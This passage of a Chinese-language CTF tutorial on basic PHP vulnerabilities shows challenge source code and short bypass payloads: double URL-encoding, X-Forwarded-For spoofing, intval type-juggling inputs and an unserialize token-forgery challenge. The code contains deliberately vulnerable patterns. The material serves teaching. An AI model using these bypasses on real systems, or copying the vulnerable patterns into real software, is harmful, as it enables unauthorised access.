<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$flag</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$m</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"hackerDJ"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Access granted!&lt;/p>"</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>flag: *****************&#125; &lt;/p>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>这样逻辑是对的</p>
</blockquote>
<p>代码逻辑：获取 GET 请求中的 id 参数，判断 id 参数是否与 “hackerDJ” 相同，如果相同，寄。<br>如果不相同，继续往下看，判断 url 编码后 的 id 变量是否与 “hackerDJ” 相同，这个地方需要对 id 的值进行二次编码，因为第一次编码传进去的会经过一次解码，所以会编程 hackDJ；所以我们的 payload 如下</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;%2568%2561%2563%256b%2544%254a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这道题还是有点二，算了，就当是二次编码的一个学习吧。</p>
<h3 id="9-X-Forwarded-For-绕过指定-IP-地址"><a href="#9-X-Forwarded-For-绕过指定-IP-地址" class="headerlink" title="9. X-Forwarded-For 绕过指定 IP 地址"></a>9. X-Forwarded-For 绕过指定 IP 地址</h3><p>这个有点意思，源码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">GetIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_CLIENT_IP"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$cip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_CLIENT_IP"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_X_FORWARDED_FOR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$cip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_X_FORWARDED_FOR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$cip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">else</span>
    <span class="token variable">$cip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0.0.0.0"</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token variable">$cip</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$GetIPs</span> <span class="token operator">=</span> <span class="token function">GetIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$GetIPs</span><span class="token operator">==</span><span class="token string double-quoted-string">"1.1.1.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"Great! flag is ctf&#123;*********&#125;"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"错误！你的IP不在访问列表之内！"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>做这道题之前不妨先了解一下<code>HTTP_CLIENT_IP</code>、<code>X_FORWARDED_FOR</code>和<code>REMOTE_ADDR</code></p>
<p>HTTP_CLIENT_IP 是代理服务器发送的HTTP头</p>
<pre class="line-numbers language-none"><code class="language-none">HTTP_CLIENT_IP 是代理服务器发送的HTTP头，HTTP_CLIENT_IP确实存在于http请求的header里。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>X_FORWARDED_FOR</p>
<blockquote>
<p>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP<br>代理或者负载均衡服务器时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP</p>
</blockquote>
<p>REMOTE_ADDR</p>
<blockquote>
<p>表示发出请求的远程主机的 IP<br>地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP</p>
</blockquote>
<p>简单的总结一下就是</p>
<pre class="line-numbers language-none"><code class="language-none">$_SERVER[&#39;REMOTE_ADDR&#39;]; &#x2F;&#x2F;访问端（有可能是用户，有可能是代理的）IP
$_SERVER[&#39;HTTP_CLIENT_IP&#39;]; &#x2F;&#x2F;代理端的（有可能存在，可伪造）
$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; &#x2F;&#x2F;用户是在哪个IP使用的代理（有可能存在，也可以伪造）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>尝试伪造 XFF 头来进行绕过</p>
<img src="/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XFFBypass.png" class="">

<h3 id="10-intval-函数"><a href="#10-intval-函数" class="headerlink" title="10. intval 函数"></a>10. intval 函数</h3><ul>
<li>这里有四块内容，慢慢讲</li>
</ul>
<p>int intval(var,base) 的特性</p>
<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制： </p>
<ul>
<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，  </li>
<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，  </li>
<li>将使用 10 进制 (decimal)。</li>
</ul>
<h4 id="intval-四舍五入绕过"><a href="#intval-四舍五入绕过" class="headerlink" title="intval 四舍五入绕过"></a>intval 四舍五入绕过</h4><p>源代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token constant">SAE_MYSQL_HOST_M</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token constant">SAE_MYSQL_PORT</span><span class="token punctuation">,</span><span class="token constant">SAE_MYSQL_USER</span><span class="token punctuation">,</span><span class="token constant">SAE_MYSQL_PASS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token constant">SAE_MYSQL_DB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$query</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select content from ctf2 where id='<span class="token interpolation"><span class="token variable">$id</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>no! try again&lt;/p>"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>绕如其名</p>
<p>整体看过后，发现重点大致是这几句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span> 、<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$query</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select content from ctf2 where id='<span class="token interpolation"><span class="token variable">$id</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">2</span>、<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1024</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>第二个语句是<code>$_GET[id]</code>不等于1024时才往下执行，但好端端的为什么要提到这个1024呢，往下运行是输出查询结果，这是不是间接的说明id为1024时对应的内容为flag呢，因此我们这里去构造一个1024即可，但等于1024又无法往下运行，这个时候就关注到了查询语句中是<code>$id</code>，而<code>$id</code>是<code>intval($_GET[id])</code>，因此这里就可以用intval的几个特性来绕过了</p>
<p>从官方例子中也可以看出，小数点后不计，那我们这里传值1024.2，在查询时不也是1024吗，而且后面检测是否为1024时还可以绕过检测，因此最终payload为</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1024.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h4 id="绕-preg-match-正则"><a href="#绕-preg-match-正则" class="headerlink" title="绕 preg_match 正则"></a>绕 preg_match 正则</h4><p>源代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>0 - 9 都被过滤了，所以要用数组来绕过</p>
<p>payload：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">num[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="绕某个具体数字"><a href="#绕某个具体数字" class="headerlink" title="绕某个具体数字"></a>绕某个具体数字</h4><p>源代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这关的话就是要求变量值不能为4476，但用过intval函数后为4476，这里的话我们首先需要知道intval的第二个参数为0时的意思是什么</p>
<p>根据这张图绕过</p>
<img src="/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/intval.png" class="">

<p>看到这里的话就可以看出payload就有多种构造方法了</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">num&#x3D;4476e123
&#x2F;&#x2F;这里就跟上面那个单引号的1e10情况一样，此时只看字母前面的
num&#x3D;4476.1
&#x2F;&#x2F;计算int值时，后面有小数点会直接舍去
num&#x3D;0x117c
&#x2F;&#x2F;0x表明是十六进制数，117c是4476的十六进制数
num&#x3D;010574
&#x2F;&#x2F;0表明是八进制数，10574是4476的八进制数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload:</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?number&#x3D;010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="终极绕过"><a href="#终极绕过" class="headerlink" title="终极绕过"></a>终极绕过</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这道题的话看着几乎是防死了，多过滤了<code>.</code>，这就意味着小数点绕过行不通，此时我们看到这个i修饰符，想到那个m修饰符，此时就想起来有个换行符%0a，它对实际输出没影响，它还可以绕过上面的那些函数，因此我们这里构造如下语句，就实现了绕过，由于小数点不能用，这里就用八进制</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">num&#x3D;%0a010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="11-十六进制与数字比较"><a href="#11-十六进制与数字比较" class="headerlink" title="11. 十六进制与数字比较"></a>11. 十六进制与数字比较</h3><h2 id="0x04-结合-SQL"><a href="#0x04-结合-SQL" class="headerlink" title="0x04 结合 SQL"></a>0x04 结合 SQL</h2><h3 id="1-token-伪造"><a href="#1-token-伪造" class="headerlink" title="1. token 伪造"></a>1. token 伪造</h3><ul>
<li>源代码</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">include</span> <span class="token string single-quoted-string">'common.php'</span><span class="token punctuation">;</span>
    <span class="token variable">$requset</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//把一个或多个数组合并为一个数组</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">db</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$where</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">where</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">select</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select * from user where '</span><span class="token operator">.</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//函数执行一条 MySQL 查询。</span>
            <span class="token keyword">return</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$requset</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$login</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">gzuncompress</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$requset</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//gzuncompress:进行字符串压缩</span>
        <span class="token comment">//unserialize: 将已序列化的字符串还原回 PHP 的值</span>

        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user=\''</span><span class="token operator">.</span><span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$login</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$login</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'ichunqiu'</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$login</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'unserialize injection!!'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"(╯‵□′)╯︵┴─┴ "</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: index.php?error=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>重点的话有以下几处，分别是输出 flag 的地方</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$login</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'ichunqiu'</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这就要求 <code>$login[&#39;user&#39;]</code> 为 <code>ichunqiu</code>，其次就是它的加密</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$requset</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span>
    <span class="token punctuation">&#123;</span>
